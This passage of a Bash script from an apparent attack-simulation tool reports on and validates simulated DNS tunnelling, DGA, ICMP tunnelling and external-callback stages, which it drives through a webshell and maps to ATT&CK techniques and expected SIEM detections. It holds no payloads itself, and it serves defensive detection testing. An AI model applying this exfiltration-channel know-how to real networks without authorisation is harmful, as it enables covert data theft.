    EXTERNAL_CALLBACK_STATUS=$(external_callback_stage_status)
    INTERNAL_FANOUT_STATUS=$(internal_fanout_stage_status)
    cat <<EOF
External Callback
- attempted                 : ${EXTERNAL_CALLBACK_ATTEMPTED:-0}
- connected                 : ${EXTERNAL_CALLBACK_CONNECTED:-0}
- responses                 : ${EXTERNAL_CALLBACK_RESPONSES:-0}
- status                    : ${EXTERNAL_CALLBACK_STATUS}

Internal Web Fanout
- targets                   : ${INTERNAL_FANOUT_TARGETS:-0}
- attempted                 : ${INTERNAL_FANOUT_ATTEMPTED:-0}
- connected                 : ${INTERNAL_FANOUT_CONNECTED:-0}
- responses                 : ${INTERNAL_FANOUT_RESPONSES:-0}
- status                    : ${INTERNAL_FANOUT_STATUS}

DNS Tunnel
- planned                   : ${DNS_QUERIES_PLANNED:-0}
- attempted                 : ${DNS_QUERIES_ATTEMPTED:-0}
- responses                 : ${DNS_RESPONSES_RECEIVED:-0}
- target resolver           : ${DNS_TARGET_SERVER:-n/a} (source=${DNS_TARGET_SELECTION_SOURCE:-unknown})
- fallback resolver used    : ${DNS_TUNNEL_FALLBACK_RESOLVER:-false}
- simulation mode           : ${DNS_TUNNEL_MODE_USED:-${DNS_TUNNEL_MODE:-auto}}
- query tool                : ${DNS_TUNNEL_QUERY_TOOL:-n/a}
- A / TXT queries           : ${DNS_A_QUERIES:-0} / ${DNS_TXT_QUERIES:-0}
- NXDOMAIN / timeout        : ${DNS_TUNNEL_NXDOMAIN_COUNT:-0} / ${DNS_TUNNEL_TIMEOUT_COUNT:-0}
- avg / max FQDN length     : $(( DNS_TUNNEL_FQDN_COUNT > 0 ? DNS_TUNNEL_FQDN_LEN_SUM / DNS_TUNNEL_FQDN_COUNT : 0 )) / ${DNS_TUNNEL_FQDN_LEN_MAX:-0}
- entropy indicator         : ${DNS_TUNNEL_APPROX_ENTROPY:-0}
- effective_tld count       : ${DNS_EFFECTIVE_TLD_COUNT:-0}
- suspicious_tld count      : ${DNS_SUSPICIOUS_TLD_COUNT:-0}
- cluster.local count       : ${DNS_CLUSTER_LOCAL_COUNT:-0}
- powerapps-style count     : ${DNS_POWERAPPS_STYLE_COUNT:-0}
- HTTPS query count         : ${DNS_HTTPS_QUERY_COUNT:-0}
- skip reason               : ${DNS_TUNNEL_SKIP_REASON:-none}
- stage status              : ${DNS_TUNNEL_STAGE_STATUS:-skipped}
- expected detection        : DNS Tunneling Anomaly (dns_tunnel / T1048)

DGA Simulation
- enabled                   : ${DGA_SIMULATION_ENABLED}
- resolvable TLD              : ${DGA_RESOLVABLE_TLD:-com}
- resolver                  : ${DGA_DNS_SERVER:-n/a} (source=${DGA_DNS_SOURCE:-unknown})
- total queries             : ${DGA_TOTAL_QUERIES:-0}
- NXDOMAIN count            : ${DGA_NXDOMAIN_COUNT:-0}
- resolvable (with IP)      : ${DGA_RESOLVED_COUNT:-0}
- timeout / error           : ${DGA_TIMEOUT_COUNT:-0} / ${DGA_ERROR_COUNT:-0}
- same effective TLD        : ${DGA_SAME_EFFECTIVE_TLD:-no}
- detection likelihood      : ${DGA_DETECTION_LIKELIHOOD:-LOW}
- stage status              : ${DGA_STAGE_STATUS:-skipped}
- skip reason               : ${DGA_SKIP_REASON:-none}
- expected detection        : DGA / DNS Anomaly (high-entropy NXDOMAIN burst)

ICMP Tunnel
- planned                   : ${ICMP_PACKETS_PLANNED:-0}
- attempted / sent          : ${ICMP_PACKETS_ATTEMPTED:-0}
- replies received          : ${ICMP_REPLIES_RECEIVED:-0}
- packet loss               : ${ICMP_PACKET_LOSS:-0}%
- estimated bytes           : ${ICMP_ESTIMATED_BYTES:-0}
- mode                      : ${ICMP_MODE_USED:-${ICMP_TUNNEL_MODE:-auto}}
- target                    : ${ICMP_SELECTED_TARGET:-n/a} (reachable=${ICMP_TARGET_REACHABLE:-unknown})
- webshell source           : ${ICMP_WEBSHELL_EXEC_HOST:-unknown}
- payload sizes             : ${ICMP_PAYLOAD_SIZES_USED:-1300-1450} (avg ${ICMP_PAYLOAD_SIZE_AVG:-0})
- skip reason               : ${ICMP_SKIP_REASON:-none}
- stage status              : ${ICMP_TUNNEL_STAGE_STATUS:-skipped}
- expected detection        : ICMP Based Exfiltration or Tunneling (icmp_tunnel / traffic_icmp_exfiltration / T1048.003)

Non-Standard Port Follow-up
- connections               : ${NONSTANDARD_PORT_CONNECTIONS:-0}
- beacon cycles (external)  : ${CORRELATION_BEACON_CYCLES:-0}
EOF
}

poc_live_log_stage_line_from_state() {
    local stage_label="$1" state_file="${LOCAL_STATE_DIR}/stage_results.log"
    local line="" status="" reason=""
    [[ -f "${state_file}" ]] || return 1
    line=$(grep -F "${stage_label}:" "${state_file}" 2>/dev/null | tail -n1 || true)
    [[ -z "${line}" ]] && return 1
    status=${line#${stage_label}: }
    status=${status%% |*}
    reason=""
    [[ "${line}" == *"| Reason: "* ]] && reason=${line#*| Reason: }
    printf 'Stage result: %s = %s%s\n' "${stage_label}" "${status}" "${reason:+ — ${reason}}"
}

poc_collect_dns_tunnel_live_log() {
    local out="${LOG_DIR}/live_validation_dns_tunnel.log" stage_line=""
    mkdir -p "${LOG_DIR}" 2>/dev/null || true
    {
        [[ -n "${LOG_FILE:-}" && -f "${LOG_FILE}" ]] && grep -E 'DNS Tunnel:|DNS_PAYLOAD_TRANSPORT|DNS_TUNNEL_|DNS_STAGE_FINAL|Stage result: DNS Tunnel|ROOT_CAUSE_ANALYSIS module=DNS' "${LOG_FILE}" 2>/dev/null || true
        [[ -f "${LOG_DIR}/dns_tunnel_waves.log" ]] && cat "${LOG_DIR}/dns_tunnel_waves.log"
        [[ -f "${LOCAL_STATE_DIR}/dns_tunnel_simulation.log" ]] && cat "${LOCAL_STATE_DIR}/dns_tunnel_simulation.log"
        [[ -f "${LOCAL_STATE_DIR}/dns_tunnel_final_summary.log" ]] && cat "${LOCAL_STATE_DIR}/dns_tunnel_final_summary.log"
        [[ -f "${LOCAL_STATE_DIR}/dns_tunnel_statistics.log" ]] && cat "${LOCAL_STATE_DIR}/dns_tunnel_statistics.log"
        stage_line=$(poc_live_log_stage_line_from_state "DNS Tunnel" 2>/dev/null || true)
        [[ -n "${stage_line}" ]] && printf '%s\n' "${stage_line}"
    } > "${out}"
    printf '%s' "${out}"
}

poc_collect_dga_live_log() {
    local out="${LOG_DIR}/live_validation_dga_simulation.log" stage_line=""
    mkdir -p "${LOG_DIR}" 2>/dev/null || true
    {
        [[ -n "${LOG_FILE:-}" && -f "${LOG_FILE}" ]] && grep -E 'DGA_|Stage result: DGA Simulation|ROOT_CAUSE_ANALYSIS module=DGA' "${LOG_FILE}" 2>/dev/null || true
        [[ -f "${LOG_DIR}/dga_simulation.log" ]] && cat "${LOG_DIR}/dga_simulation.log"
        [[ -f "${LOCAL_STATE_DIR}/dga_simulation.log" ]] && cat "${LOCAL_STATE_DIR}/dga_simulation.log"
        stage_line=$(poc_live_log_stage_line_from_state "DGA Simulation" 2>/dev/null || true)
        [[ -n "${stage_line}" ]] && printf '%s\n' "${stage_line}"
    } > "${out}"
    printf '%s' "${out}"
}

poc_emit_live_log_validation() {
    local module="$1" result="$2" detail="$3"
    LIVE_LOG_VALIDATION="${result}"
    case "${module}" in
        dns_tunnel) DNS_LIVE_LOG_VALIDATION="${result}" ;;
        dga_simulation) DGA_LIVE_LOG_VALIDATION="${result}" ;;
        icmp_tunnel) ;;
        dns_new_tld) DNS_NEW_TLD_LIVE_LOG_VALIDATION="${result}" ;;
    esac
    printf 'LIVE_LOG_VALIDATION=%s\n' "${result}"
    log_message "OK" "LIVE_LOG_VALIDATION=${result} module=${module} detail=${detail}"
    state_append "live_log_validation.log" "module=${module} result=${result} detail=${detail}"
}

poc_run_dns_tunnel_live_log_validation() {
    local log_path="" err="" report_status="skipped"
    [[ "${DRY_RUN}" == true ]] && {
        poc_emit_live_log_validation "dns_tunnel" "skipped" "dry_run"
        write_report_entries "dns_tunnel_live_log" "T1071.004" "NDR/SIEM" "DNS Live Log Validation" "${TARGET_NET}" "skipped" "dry_run"
        return 0
    }
    if [[ "${DNS_TUNNEL_STAGE_STATUS}" == skipped ]]; then
        poc_emit_live_log_validation "dns_tunnel" "skipped" "${DNS_TUNNEL_SKIP_REASON:-stage_skipped}"
        write_report_entries "dns_tunnel_live_log" "T1071.004" "NDR/SIEM" "DNS Live Log Validation" "${TARGET_NET}" "skipped" "${DNS_TUNNEL_SKIP_REASON:-stage_skipped}"
        return 0
    fi
    log_path=$(poc_collect_dns_tunnel_live_log)
    if poc_validate_dns_tunnel_live_log "${log_path}" err; then
        poc_emit_live_log_validation "dns_tunnel" "passed" "${err}"
        report_status="success"
        write_report_entries "dns_tunnel_live_log" "T1071.004" "NDR/SIEM" "DNS Live Log Validation" "${TARGET_NET}" "${report_status}" "${err}"
        return 0
    fi
    poc_emit_live_log_validation "dns_tunnel" "failed" "${err}"
    write_report_entries "dns_tunnel_live_log" "T1071.004" "NDR/SIEM" "DNS Live Log Validation" "${TARGET_NET}" "failed" "${err}"
    return 1
}

poc_run_dga_live_log_validation() {
    local log_path="" err="" report_status="skipped"
    [[ "${DRY_RUN}" == true ]] && {
        poc_emit_live_log_validation "dga_simulation" "skipped" "dry_run"
        write_report_entries "dga_live_log" "T1568.002" "NDR/SIEM" "DGA Live Log Validation" "${TARGET_NET}" "skipped" "dry_run"
        return 0
    }
    if [[ "${DGA_STAGE_STATUS}" == Skipped || "${DGA_SIMULATION_ENABLED}" != true ]]; then
        poc_emit_live_log_validation "dga_simulation" "skipped" "${DGA_SKIP_REASON:-disabled}"
        write_report_entries "dga_live_log" "T1568.002" "NDR/SIEM" "DGA Live Log Validation" "${TARGET_NET}" "skipped" "${DGA_SKIP_REASON:-disabled}"
        return 0
    fi
    log_path=$(poc_collect_dga_live_log)
    if poc_validate_dga_live_log "${log_path}" err; then
        poc_emit_live_log_validation "dga_simulation" "passed" "${err}"
        report_status="success"
        write_report_entries "dga_live_log" "T1568.002" "NDR/SIEM" "DGA Live Log Validation" "${TARGET_NET}" "${report_status}" "${err}"
        return 0
    fi
    poc_emit_live_log_validation "dga_simulation" "failed" "${err}"
    write_report_entries "dga_live_log" "T1568.002" "NDR/SIEM" "DGA Live Log Validation" "${TARGET_NET}" "failed" "${err}"
    return 1
}

poc_collect_dns_new_tld_live_log() {
    local line="" stage_line=""
    line=$(read_state_file_or_none "dns_new_tld_test.log" | grep -E '^DNS_NEW_TLD_' | tail -n200 || true)
    if [[ -z "${line}" && -n "${LOG_DIR}" && -f "${LOG_DIR}/dns_new_tld_test.log" ]]; then
        line=$(grep -E '^DNS_NEW_TLD_' "${LOG_DIR}/dns_new_tld_test.log" 2>/dev/null | tail -n200 || true)
    fi
    stage_line=$(poc_live_log_stage_line_from_state "DNS New TLD Test" 2>/dev/null || true)
    printf '%s\n%s\n' "${line}" "${stage_line}"
}

poc_run_dns_new_tld_live_log_validation() {
    local log_path="" err="" report_status="skipped"
    [[ "${DRY_RUN}" == true ]] && {
        poc_emit_live_log_validation "dns_new_tld" "skipped" "dry_run"
        write_report_entries "dns_new_tld_live_log" "T1071" "NDR/SIEM" "DNS New TLD Live Log Validation" "${TARGET_NET}" "skipped" "dry_run"
        return 0
    }
    if [[ "${DNS_NEW_TLD_STAGE_STATUS}" == Skipped || "${DNS_NEW_TLD_ENABLED}" != true ]]; then
        poc_emit_live_log_validation "dns_new_tld" "skipped" "${DNS_NEW_TLD_SKIP_REASON:-disabled}"
        write_report_entries "dns_new_tld_live_log" "T1071" "NDR/SIEM" "DNS New TLD Live Log Validation" "${TARGET_NET}" "skipped" "${DNS_NEW_TLD_SKIP_REASON:-disabled}"
        return 0
    fi
    log_path=$(poc_collect_dns_new_tld_live_log)
    if poc_validate_dns_new_tld_live_log "${log_path}" err; then
        poc_emit_live_log_validation "dns_new_tld" "passed" "${err}"
        report_status="success"
        write_report_entries "dns_new_tld_live_log" "T1071" "NDR/SIEM" "DNS New TLD Live Log Validation" "${TARGET_NET}" "${report_status}" "${err}"
        return 0
    fi
    poc_emit_live_log_validation "dns_new_tld" "failed" "${err}"
    write_report_entries "dns_new_tld_live_log" "T1071" "NDR/SIEM" "DNS New TLD Live Log Validation" "${TARGET_NET}" "failed" "${err}"
    return 1
}

poc_live_log_read_content() {
    local log_input="$1"
    if [[ -f "${log_input}" ]]; then
        cat "${log_input}"
    else
        printf '%s' "${log_input}"
    fi
}

poc_live_log_last_match() {
    local content="$1" pattern="$2"
    printf '%s\n' "${content}" | grep -E "${pattern}" | tail -n1 || true
}

poc_live_log_stage_status() {
    local stage_line="$1"
    case "${stage_line}" in
        *"= Success"*) printf 'Success' ;;
        *"= Partial"*) printf 'Partial' ;;
        *"= Failed"*) printf 'Failed' ;;
        *"= Skipped"*) printf 'Skipped' ;;
        *"= Fallback"*) printf 'Fallback' ;;
        *) printf 'unknown' ;;
    esac
}

poc_live_log_assert_no_success_on_zero_dns() {
    local attempted="$1" unique="$2" final_result="$3" stage_status="$4" entropy="${5:-0}" likelihood="${6:-LOW}" actual="${7:-0}"
    actual=$(safe_int "${actual}")
    if (( actual > 0 )); then
        attempted="${actual}"
    fi
    if (( attempted == 0 || unique == 0 )); then
        [[ "${final_result}" == success ]] && return 1
        [[ "${stage_status}" == Success ]] && return 1
    fi
    if [[ "${final_result}" == success || "${stage_status}" == Success ]]; then
        if (( entropy == 0 )); then
            return 1
        fi
        if [[ "${likelihood}" == LOW ]]; then
            return 1
        fi
    fi
    return 0
}

poc_live_log_assert_no_success_on_icmp_tunnel() {
    local actual="$1" planned="$2" final_result="$3" stage_status="$4" likelihood="${5:-LOW}" stage_final="${6:-}"
    actual=$(safe_int "${actual}")
    planned=$(safe_int "${planned}")
    if [[ "${final_result}" == success && "${stage_status}" == Partial ]]; then
        return 1
    fi
    if [[ "${likelihood}" == LOW ]]; then
        [[ "${final_result}" == success ]] && return 1
        [[ "${stage_status}" == Success ]] && return 1
    fi
    if (( actual < 80 )); then
        [[ "${final_result}" == success ]] && return 1
        [[ "${stage_status}" == Success ]] && return 1
    fi
    if [[ "${final_result}" == success || "${stage_status}" == Success ]]; then
        if (( actual < 80 )); then
            return 1
        fi
    fi
    return 0
}

poc_validate_icmp_tunnel_live_log() {
    local log_input="$1" err_out="${2:-POC_LIVE_LOG_VALIDATE_ERR}" content="" errors=""
    local stats_line="" final_summary="" stage_line=""
    local planned=0 attempted_planned=0 actual=0 received=0 final_result="" stage_status="" likelihood=""

    content=$(poc_live_log_read_content "${log_input}")
    stats_line=$(poc_live_log_last_match "${content}" 'ICMP_TUNNEL_STATS')
    final_summary=$(poc_live_log_last_match "${content}" 'ICMP_TUNNEL_FINAL_SUMMARY')
    stage_line=$(poc_live_log_last_match "${content}" 'Stage result: ICMP Tunnel')

    [[ -z "${stats_line}" ]] && errors+="missing ICMP_TUNNEL_STATS; "
    [[ -z "${final_summary}" ]] && errors+="missing ICMP_TUNNEL_FINAL_SUMMARY; "

    if [[ -n "${stats_line}" ]]; then
        for key in planned_packets attempted_packets actual_packets replies detection_likelihood result; do
            [[ "${stats_line}" != *"${key}="* ]] && errors+="ICMP_TUNNEL_STATS missing ${key}; "
        done
        planned=$(safe_int "$(dns_stats_field_from_line "${stats_line}" planned_packets)")
        attempted_planned=$(safe_int "$(dns_stats_field_from_line "${stats_line}" attempted_packets)")
        actual=$(safe_int "$(dns_stats_field_from_line "${stats_line}" actual_packets)")
        received=$(safe_int "$(dns_stats_field_from_line "${stats_line}" replies)")
        likelihood=$(dns_stats_field_from_line "${stats_line}" detection_likelihood)
    fi

    if [[ -n "${final_summary}" ]]; then
        final_result=$(dns_stats_field_from_line "${final_summary}" result)
        [[ -z "${likelihood}" ]] && likelihood=$(dns_stats_field_from_line "${final_summary}" detection_likelihood)
        (( planned < 1 )) && planned=$(safe_int "$(dns_stats_field_from_line "${final_summary}" planned_packets)")
        (( attempted_planned < 1 )) && attempted_planned=$(safe_int "$(dns_stats_field_from_line "${final_summary}" attempted_packets)")
        (( actual < 1 )) && actual=$(safe_int "$(dns_stats_field_from_line "${final_summary}" actual_packets)")
        [[ "${final_summary}" != *partial_packets_estimated=* ]] && errors+="ICMP_TUNNEL_FINAL_SUMMARY missing partial_packets_estimated; "
        [[ "${final_summary}" != *timeout_bursts=* ]] && errors+="ICMP_TUNNEL_FINAL_SUMMARY missing timeout_bursts; "
        if [[ "${final_summary}" == *result=success* && "${final_summary}" == *detection_likelihood=LOW* ]]; then
            errors+="ICMP_TUNNEL_FINAL_SUMMARY contradicts success with detection_likelihood=LOW; "
        fi
        if [[ "${final_summary}" == *result=success* && "${final_summary}" == *detection_likelihood=MEDIUM* ]]; then
            errors+="ICMP_TUNNEL_FINAL_SUMMARY contradicts success with detection_likelihood=MEDIUM; "
        fi
        if [[ "${final_summary}" == *planned_packets=180* && "${final_summary}" == *actual_packets=5* && "${final_summary}" == *result=success* ]]; then
            errors+="planned=180 actual=5 must not be result=success; "
        fi
        if [[ "${final_summary}" == *actual_packets=180* && "${final_summary}" == *received_packets=5* && "${final_summary}" == *result=success* ]]; then
            errors+="actual=180 received=5 must not be result=success; "
        fi
    fi

    if [[ "${content}" == *ICMP_PAYLOAD_TRANSPORT* ]] && [[ "${content}" == *payload_bytes=6581* ]] && [[ "${content}" == *webshell_method=GET* ]] \
        && [[ "${content}" != *ICMP_TRANSPORT_SWITCH* ]] && [[ "${content}" != *switched_get_to_post=yes* ]]; then
        errors+="ICMP large payload must switch GET to POST (ICMP_TRANSPORT_SWITCH); "
    fi
    if grep -qE 'ICMP_TUNNEL_BURST_RESULT.*parsed_sent=([0-9]+).*parsed_sent=([0-9]+)' "${content}" 2>/dev/null; then
        :
    fi
    local prev_sent=-1 cur_sent=0 bid=0
    while IFS= read -r br_line; do
        cur_sent=$(safe_int "$(dns_stats_field_from_line "${br_line}" parsed_sent)")
        bid=$(safe_int "$(dns_stats_field_from_line "${br_line}" burst_id)")
        if (( prev_sent > 0 && cur_sent > prev_sent && cur_sent - prev_sent <= 15 )); then
            errors+="output_parse_contaminated burst_id=${bid} parsed_sent=${cur_sent} after=${prev_sent}; "
        fi
        prev_sent="${cur_sent}"
    done < <(grep 'ICMP_TUNNEL_BURST_RESULT' <<< "${content}" || true)
    local timeout_burst_in_actual=no
    while IFS= read -r br_line; do
        [[ "${br_line}" == *timed_out=true* || "${br_line}" == *failure_reason=webshell_timeout* || "${br_line}" == *ROOT_CAUSE=webshell_timeout* ]] || continue
        cur_sent=$(safe_int "$(dns_stats_field_from_line "${br_line}" parsed_sent)")
        (( cur_sent > 0 )) && timeout_burst_in_actual=yes
    done < <(grep 'ICMP_TUNNEL_BURST_RESULT' <<< "${content}" || true)
    if [[ "${timeout_burst_in_actual}" == yes && "${stats_line}" == *actual_packets=180* && "${stats_line}" == *replies=5* ]]; then
        errors+="timeout burst parsed_sent included in inflated actual_packets; "
    fi

    [[ "${content}" != *ICMP_TUNNEL_BURST_COMMAND* ]] && errors+="missing ICMP_TUNNEL_BURST_COMMAND; "
    [[ "${content}" != *ICMP_TUNNEL_BURST_RESULT* ]] && errors+="missing ICMP_TUNNEL_BURST_RESULT; "
    [[ "${content}" != *ICMP_BURST_TRANSPORT* ]] && errors+="missing ICMP_BURST_TRANSPORT; "
    [[ "${content}" != *ICMP_BURST_RESULT* ]] && errors+="missing ICMP_BURST_RESULT; "
    [[ "${content}" != *ICMP_BURST_AGGREGATION* ]] && errors+="missing ICMP_BURST_AGGREGATION; "
    [[ "${final_summary}" != *detection_readiness=* ]] && errors+="ICMP_TUNNEL_FINAL_SUMMARY missing detection_readiness; "
    [[ "${final_summary}" != *root_cause=* ]] && errors+="ICMP_TUNNEL_FINAL_SUMMARY missing root_cause; "

    stage_status=$(poc_live_log_stage_status "${stage_line}")
    if ! poc_live_log_assert_no_success_on_icmp_tunnel "${actual}" "${planned}" "${final_result}" "${stage_status}" "${likelihood}"; then
        errors+="invalid success: actual=${actual} planned=${planned} likelihood=${likelihood} final=${final_result} stage=${stage_status}; "
    fi

    if [[ -n "${errors}" ]]; then
        printf -v "${err_out}" '%s' "${errors}"
        return 1
    fi
    printf -v "${err_out}" '%s' "ok planned=${planned} attempted_burst=${attempted_planned} actual=${actual} received=${received} likelihood=${likelihood} result=${final_result} stage=${stage_status}"
    return 0
}

poc_live_log_assert_no_success_on_zero_dga() {
    local queries="$1" nxdomain="$2" stage_status="$3" final_result="${4:-failed}" resolved="${5:-0}" actual_queries="${6:-0}" actual_nx="${7:-0}"
    actual_queries=$(safe_int "${actual_queries}")
    actual_nx=$(safe_int "${actual_nx}")
    if (( actual_queries > 0 )); then
        queries="${actual_queries}"
    fi
    if (( actual_nx > 0 )); then
        nxdomain="${actual_nx}"
    fi
    if (( queries == 0 || nxdomain == 0 )); then
        [[ "${stage_status}" == Success ]] && return 1
        [[ "${final_result}" == success ]] && return 1
    fi
    if [[ "${final_result}" == success || "${stage_status}" == Success ]]; then
        if (( nxdomain < 150 || resolved < 3 )); then
            return 1
        fi
    fi
    return 0
}

poc_validate_dns_tunnel_live_log() {
    local log_input="$1" err_out="${2:-POC_LIVE_LOG_VALIDATE_ERR}" content="" errors=""
    local transport="" sim_stats="" statistics="" final_summary="" stage_line=""
    local attempted=0 unique=0 planned=0 nx=0 payload_bytes=0 method="" final_result="" stage_status=""
    local sim_attempted=0 stat_queries=0 stat_unique=0 sim_planned=0 entropy=0 likelihood=""
    local actual_dns=0 query_generated=0 query_sent=0 query_responded=0

    content=$(poc_live_log_read_content "${log_input}")
    transport=$(poc_live_log_last_match "${content}" 'DNS_PAYLOAD_TRANSPORT')
    sim_stats=$(poc_live_log_last_match "${content}" 'DNS_TUNNEL_SIM_STATS')
    statistics=$(poc_live_log_last_match "${content}" 'DNS_TUNNEL_STATISTICS')
    final_summary=$(poc_live_log_last_match "${content}" 'DNS_TUNNEL_FINAL_SUMMARY')
    stage_line=$(poc_live_log_last_match "${content}" 'Stage result: DNS Tunnel')

    [[ -z "${transport}" ]] && errors+="missing DNS_PAYLOAD_TRANSPORT; "
    [[ -z "${sim_stats}" && -z "${statistics}" ]] && errors+="missing DNS_TUNNEL_SIM_STATS and DNS_TUNNEL_STATISTICS; "
    [[ -z "${final_summary}" ]] && errors+="missing DNS_TUNNEL_FINAL_SUMMARY; "

    if [[ -n "${final_summary}" ]]; then
        for key in planned attempted unique_queries nxdomain payload_bytes webshell_method result entropy_score detection_likelihood query_generated query_sent query_responded actual_dns_queries actual_txt_queries actual_nxdomain; do
            [[ "${final_summary}" != *"${key}="* ]] && errors+="DNS_TUNNEL_FINAL_SUMMARY missing ${key}; "
        done
        attempted=$(safe_int "$(dns_stats_field_from_line "${final_summary}" attempted)")
        unique=$(safe_int "$(dns_stats_field_from_line "${final_summary}" unique_queries)")
        planned=$(safe_int "$(dns_stats_field_from_line "${final_summary}" planned)")
        nx=$(safe_int "$(dns_stats_field_from_line "${final_summary}" nxdomain)")
        actual_dns=$(safe_int "$(dns_stats_field_from_line "${final_summary}" actual_dns_queries)")
        query_generated=$(safe_int "$(dns_stats_field_from_line "${final_summary}" query_generated)")
        query_sent=$(safe_int "$(dns_stats_field_from_line "${final_summary}" query_sent)")
        query_responded=$(safe_int "$(dns_stats_field_from_line "${final_summary}" query_responded)")
        payload_bytes=$(safe_int "$(dns_stats_field_from_line "${final_summary}" payload_bytes)")
        method=$(dns_stats_field_from_line "${final_summary}" webshell_method)
        final_result=$(dns_stats_field_from_line "${final_summary}" result)
        entropy=$(safe_int "$(dns_stats_field_from_line "${final_summary}" entropy_score)")
        likelihood=$(dns_stats_field_from_line "${final_summary}" detection_likelihood)
    fi

    if [[ -n "${sim_stats}" ]]; then
        sim_attempted=$(safe_int "$(dns_stats_field_from_line "${sim_stats}" attempted)")
        sim_planned=$(safe_int "$(dns_stats_field_from_line "${sim_stats}" planned)")
        (( sim_planned > 0 && sim_planned <= 20 )) || errors+="DNS_TUNNEL_SIM_STATS planned=${sim_planned} not chunk-sized; "
        if [[ -n "${final_summary}" ]] && (( sim_attempted != attempted )); then
            errors+="sim_stats.attempted(${sim_attempted}) != final.attempted(${attempted}); "
        fi
    fi

    if [[ -n "${statistics}" ]]; then
        stat_queries=$(safe_int "$(dns_stats_field_from_line "${statistics}" queries)")
        stat_unique=$(safe_int "$(dns_stats_field_from_line "${statistics}" unique_queries)")
        if [[ -n "${sim_stats}" ]] && (( sim_attempted != stat_queries )); then
            errors+="sim_stats.attempted(${sim_attempted}) != statistics.queries(${stat_queries}); "
        fi
        if [[ -n "${final_summary}" ]] && (( stat_unique != unique )); then
            errors+="statistics.unique_queries(${stat_unique}) != final.unique_queries(${unique}); "
        fi
    fi

    if [[ -n "${transport}" ]]; then
        [[ "${transport}" != *payload_bytes=* ]] && errors+="DNS_PAYLOAD_TRANSPORT missing payload_bytes; "
        [[ "${transport}" != *webshell_method=* ]] && errors+="DNS_PAYLOAD_TRANSPORT missing webshell_method; "
    fi

    stage_status=$(poc_live_log_stage_status "${stage_line}")
    if ! poc_live_log_assert_no_success_on_zero_dns "${attempted}" "${unique}" "${final_result}" "${stage_status}" "${entropy}" "${likelihood}" "${actual_dns}"; then
        errors+="Success/final_result=success with attempted=${attempted} actual_dns=${actual_dns} unique=${unique} entropy=${entropy} likelihood=${likelihood}; "
    fi
    if [[ -n "${final_summary}" ]] && (( query_responded > 0 && attempted > 0 && query_responded != attempted )); then
        errors+="query_responded(${query_responded}) != attempted(${attempted}); "
    fi

    if [[ -n "${errors}" ]]; then
        printf -v "${err_out}" '%s' "${errors}"
        return 1
    fi
    printf -v "${err_out}" '%s' "ok planned=${planned} attempted=${attempted} unique=${unique} nx=${nx} payload_bytes=${payload_bytes} transport=${method:-GET} result=${final_result} stage=${stage_status}"
    return 0
}

poc_validate_dga_live_log() {
    local log_input="$1" err_out="${2:-POC_LIVE_LOG_VALIDATE_ERR}" content="" errors=""
    local transport="" nx_chunk="" chunk_summary="" stage_summary="" stage_line="" stage_final=""
    local queries=0 nxdomain=0 resolved=0 payload_bytes=0 method="" stage_status="" final_result=""
    local actual_dns=0 actual_nx=0 query_generated=0 query_sent=0 query_responded=0

    content=$(poc_live_log_read_content "${log_input}")
    transport=$(poc_live_log_last_match "${content}" 'DGA_PAYLOAD_TRANSPORT')
    nx_chunk=$(poc_live_log_last_match "${content}" 'DGA_NX_CHUNK_SUMMARY')
    chunk_summary=$(poc_live_log_last_match "${content}" 'DGA_CHUNK_SUMMARY')
    stage_summary=$(poc_live_log_last_match "${content}" 'DGA_STAGE_FINAL_SUMMARY')
    stage_line=$(poc_live_log_last_match "${content}" 'Stage result: DGA Simulation')

    [[ -z "${transport}" ]] && errors+="missing DGA_PAYLOAD_TRANSPORT; "
    [[ -z "${nx_chunk}" && -z "${chunk_summary}" ]] && errors+="missing DGA_NX_CHUNK_SUMMARY and DGA_CHUNK_SUMMARY; "
    [[ -z "${stage_summary}" ]] && errors+="missing DGA_STAGE_FINAL_SUMMARY; "

    if [[ -n "${stage_summary}" ]]; then
        for key in planned queries nxdomain payload_bytes webshell_method result query_generated query_sent query_responded actual_dns_queries actual_random_domains actual_nxdomain; do
            [[ "${stage_summary}" != *"${key}="* ]] && errors+="DGA_STAGE_FINAL_SUMMARY missing ${key}; "
        done
        queries=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" queries)")
        nxdomain=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" nxdomain)")
        resolved=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" resolved)")
        actual_dns=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" actual_dns_queries)")
        actual_nx=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" actual_nxdomain)")
        query_generated=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" query_generated)")
        query_sent=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" query_sent)")
        query_responded=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" query_responded)")
        payload_bytes=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" payload_bytes)")
        method=$(dns_stats_field_from_line "${stage_summary}" webshell_method)
        final_result=$(dns_stats_field_from_line "${stage_summary}" result)
    fi

    if [[ -n "${nx_chunk}" ]]; then
        local nx_q nx_nx
        nx_q=$(safe_int "$(dns_stats_field_from_line "${nx_chunk}" queries)")
        nx_nx=$(safe_int "$(dns_stats_field_from_line "${nx_chunk}" nxdomain)")
        if (( nx_q > 0 )); then
            (( nx_q <= 20 )) || errors+="DGA_NX_CHUNK_SUMMARY queries=${nx_q} not chunk-sized; "
        fi
    fi

    if [[ -n "${chunk_summary}" ]]; then
        local cs_q cs_nx
        cs_q=$(safe_int "$(dns_stats_field_from_line "${chunk_summary}" queries)")
        cs_nx=$(safe_int "$(dns_stats_field_from_line "${chunk_summary}" nxdomain)")
        if [[ -n "${stage_summary}" ]] && (( queries > 0 && cs_q > queries )); then
            errors+="chunk_summary queries(${cs_q}) exceeds stage queries(${queries}); "
        fi
        if [[ -n "${stage_summary}" ]] && (( nxdomain > 0 && cs_nx > nxdomain )); then
            errors+="chunk_summary nx(${cs_nx}) exceeds stage nx(${nxdomain}); "
        fi
    fi

    if [[ -n "${transport}" ]]; then
        [[ "${transport}" != *payload_bytes=* ]] && errors+="DGA_PAYLOAD_TRANSPORT missing payload_bytes; "
        [[ "${transport}" != *webshell_method=* ]] && errors+="DGA_PAYLOAD_TRANSPORT missing webshell_method; "
    fi

    stage_status=$(poc_live_log_stage_status "${stage_line}")
    if ! poc_live_log_assert_no_success_on_zero_dga "${queries}" "${nxdomain}" "${stage_status}" "${final_result}" "${resolved}" "${actual_dns}" "${actual_nx}"; then
        errors+="Success/result=success with queries=${queries} actual_dns=${actual_dns} nxdomain=${nxdomain} actual_nx=${actual_nx} resolved=${resolved}; "
